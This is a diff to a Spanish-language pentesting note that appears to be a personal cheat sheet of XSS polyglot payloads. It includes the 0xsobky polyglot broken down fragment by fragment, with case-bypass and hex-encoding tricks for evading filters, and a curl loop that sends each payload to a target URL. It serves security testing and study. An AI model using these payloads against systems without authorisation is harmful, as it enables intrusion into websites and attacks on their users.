@@ -1,16 +1,16 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/xss
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[Cross-Site Scripting (XSS)]]"
+  - '[[Cross-Site Scripting (XSS)]]'
 ---
 # XSS - Payloads Polyglot
 
@@ -18,19 +18,63 @@ linked:
 
 ## Cheatsheet
 
-|                                                         **Vector / Payload Polyglot**                                                          |                          **Contextos Neutralizados**                           |                                                                                                                                 **Análisis de la Estructura**                                                                                                                                  |
-| :--------------------------------------------------------------------------------------------------------------------------------------------: | :----------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
-|                                                    <br><br>`'">><script>alert(1)</script>`                                                     |           <br><br>Atributos (`"`, `'`), Etiquetas abiertas.<br><br>            |                                   <br>El payload básico. Inyecta comillas dobles y simples para cerrar cualquier atributo en el que aterrice, seguido de `>>` para asegurar el cierre de la etiqueta anfitriona antes de abrir el bloque de script.<br><br>                                    |
-|                              <br><br>`-->` `</textarea></style></title></script>` `<svg/onload=alert(1)>`<br><br>                              |      <br>Comentarios HTML, Bloques de texto plano, Etiquetas protectoras.      |                                        <br>Cierra prematuramente comentarios HTML (`-->`) y todas las etiquetas comunes que bloquean la ejecución de código (tratando el contenido como texto). Finalmente inyecta un vector basado en eventos.<br><br>                                        |
-|                                    <br><br>`javascript://%250Aalert(1)//"undefined"==typeof action&&a=="'`                                     | <br>Atributos de URL (`href`, `src`), Bloques JavaScript (`<script>`).<br><br> |                               <br>Opera como un esquema válido si aterriza en un enlace. El `%250A` (doble URL encode de un salto de línea) y los comentarios `//` aseguran que la sintaxis de JavaScript no se rompa si se refleja dentro de una variable.<br>                                |
-|                                                    <br><br>`";alert(1);//` `';alert(1);//`                                                     |                    <br><br>Variables JavaScript explícitas.                    |         <br>Diseñado para reflejos dentro de bloques `<script>` legítimos. Rompe cadenas envueltas en comillas simples o dobles, finaliza la declaración con `;`, ejecuta la alerta y comenta cualquier sintaxis residual que pueda generar errores fatales en el intérprete.<br><br>          |
-| <br><br>`jaVasCript:/*-/*\`/_`/_'/_"/**/(/_ */oNcliCk=alert(1) )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e` |           <br>Omnicontexto (Polyglot avanzado, derivado de 0xsobky).           | <br>Cubre atributos, pseudo-protocolos, scripts en línea, comentarios modernos (`--!>`), bloqueadores de texto y evasión de filtros sensibles a mayúsculas. Emplea codificación hexadecimal (`\x3c` para `<`) para evadir WAFs básicos que bloquean la apertura de etiquetas estándar.<br><br> |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `'"><script>alert(1)</script>` | Cierra `'`, `"`, `>`, abre script | Probe básico — funciona en atributos simple/doble quote + HTML body. |
+| `--></style></script></textarea></title></noscript><svg onload=alert(1)>` | Cierra comentarios HTML + 5 tags content-as-text + svg | Sin saber dónde aterriza. |
+| `javascript://%250Aalert(1)//"undefined"==typeof action&&a=="'` | Funciona en href + script blocks + atributo | URL attr + JS context — mismo payload. |
+| `";alert(1);//` | Cierra string JS doble | Reflejo dentro de `<script>var x="HERE"</script>`. |
+| `';alert(1);//` | Variante simple | Variante. |
+| `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e` | **0xsobky polyglot** — cubre 20+ contextos simultáneos | Probe one-shot universal. |
+| `>"'><img src=x onerror=alert(1)>` | Variante chica del 0xsobky | Para payloads con límite de longitud. |
+| `<svg/onload=alert(1)>` | Single-vector minimal | Fallback cuando el polyglot largo se trunca. |
 ^xss-polyglot
+
+### El payload 0xsobky desglosado
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+```
+
+| Fragmento | Cubre |
+|:---:|:---:|
+| `jaVasCript:` | Pseudo-protocolo en `href`/`src` (case bypass). |
+| `/*-/*`...`*/` | Comentarios JS multilinea que neutralizan código previo. |
+| `oNcliCk=alert(1)` | Event handler en atributo (case bypass). |
+| `//%0D%0A` | Salto de línea termina JS comment line. |
+| `</stYle/</titLe/</teXtarEa/</scRipt/` | Cierra 4 tags content-as-text. |
+| `--!>` | Cierra comentarios HTML5. |
+| `\x3csVg/<sVg/oNloAd=alert(1)//>\x3e` | Hex-encoded `<svg>` + svg directo (doble shot). |
+
+### Workflow
+
+```bash
+# 1. Probar polyglot básico primero (más corto = menos chance de filtrado)
+PAYLOADS=(
+  '"><svg onload=alert(1)>'
+  '\'"><script>alert(1)</script>'
+  '--></style></script><svg onload=alert(1)>'
+  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e'
+)
+
+for p in "${PAYLOADS[@]}"; do
+  echo "=== $p ==="
+  curl -s "https://target/?q=$(jq -sRr @uri <<<"$p")" | grep -c 'alert(1)'
+done
+
+# 2. Polyglot via Burp Intruder — list payloads → mark position → match grep
+```
 
 ___
 
 ## Overview
 
-Un payload Polyglot es una cadena de inyección multipropósito, construida meticulosamente para ejecutarse de forma simultánea en múltiples contextos de renderizado (HTML base, atributos con comillas simples o dobles, bloques de JavaScript, áreas de texto, comentarios).
+**Polyglot** = single payload que ejecuta en múltiples contextos (atributo HTML, body, script block, comentario, content-as-text tag). Útil cuando NO conocés dónde aterriza el reflejo.
 
-El objetivo de utilizar este vector es lograr la ejecución directa del script malicioso a ciegas, forzando la ruptura de múltiples barreras sintácticas al mismo tiempo, sin necesidad de conocer de antemano el punto exacto de reflexión en el código fuente ni los caracteres de escape específicos que requiere el entorno.
+**Trade-off:** longitud vs. cobertura. Polyglots largos pueden truncarse en campos con max-length. Probar varios de menor a mayor.
+
+**Referencias:**
+- [0xsobky polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
+- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+***
